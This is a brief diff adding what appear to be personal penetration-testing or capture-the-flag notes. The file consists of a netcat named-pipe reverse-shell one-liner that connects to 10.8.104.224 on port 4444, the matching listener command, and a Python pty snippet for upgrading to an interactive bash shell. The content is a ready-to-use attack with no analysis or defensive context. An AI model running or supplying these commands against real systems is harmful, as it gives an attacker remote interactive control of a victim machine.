@@ -1,0 +1,13 @@
+cmd:"
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.104.224 4444 >/tmp/f
+
+"
+
+nc -nlvp 4444
+
+
+spawn a shell
+
+$ echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
+$ python /tmp/asdf.py
